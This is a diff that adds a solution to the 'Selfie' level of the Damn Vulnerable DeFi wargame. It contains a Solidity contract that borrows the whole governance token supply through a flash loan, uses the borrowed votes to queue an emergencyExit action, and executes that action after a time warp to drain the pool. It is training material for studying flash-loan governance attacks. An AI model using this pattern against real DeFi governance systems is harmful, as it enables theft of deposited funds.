@@ -7,6 +7,61 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+// More imports - part of the solution.
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+
+
+contract HackSelfie is IERC3156FlashBorrower{
+    SelfiePool immutable selfiePool;
+    SimpleGovernance immutable simpleGovernance;
+    DamnValuableVotes immutable damnVulnerableVotes;
+    uint actionId;
+    uint immutable tokenSupply;
+    // copy paste from src/selfie/SelfiePool.sol
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    constructor(
+        address _selfiePool, 
+        address _simpleGovernance,
+        address _token,
+        uint _tokenSupply
+    ){
+        selfiePool = SelfiePool(_selfiePool);
+        simpleGovernance = SimpleGovernance(_simpleGovernance);
+        damnVulnerableVotes = DamnValuableVotes(_token);
+        tokenSupply = _tokenSupply;
+    }
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+        damnVulnerableVotes.delegate(address(this));
+        // Flash loan received. We propose the Governance to do emergencyExit(address) where address is the recovery.
+        // We have all the supply, so, 100% voting power, so, we are able to propose.
+        uint _actionId = simpleGovernance.queueAction(
+            address(selfiePool),
+            0,
+            data
+        );
+        actionId = _actionId;
+        // Allow the lender to take back what it lent.
+        IERC20(token).approve(address(selfiePool), amount+fee);
+        return CALLBACK_SUCCESS;
+    }
+
+    function startHack(address recovery) external returns(bool){
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnVulnerableVotes), tokenSupply, data);
+    }
+    function finalizeHack() external returns(bool) {
+        // No need to vote for this contract - the way it works, everything queued has already been approved.
+        bytes memory resultData = simpleGovernance.executeAction(actionId);
+    }
+}
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +117,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        HackSelfie hackSelfie = new HackSelfie(
+            address(pool),
+            address(governance),
+            address(token),
+            TOKENS_IN_POOL
+        );
+        hackSelfie.startHack(address(recovery));
+        vm.warp(block.timestamp + 2 days);
+        hackSelfie.finalizeHack();
     }
 
     /**
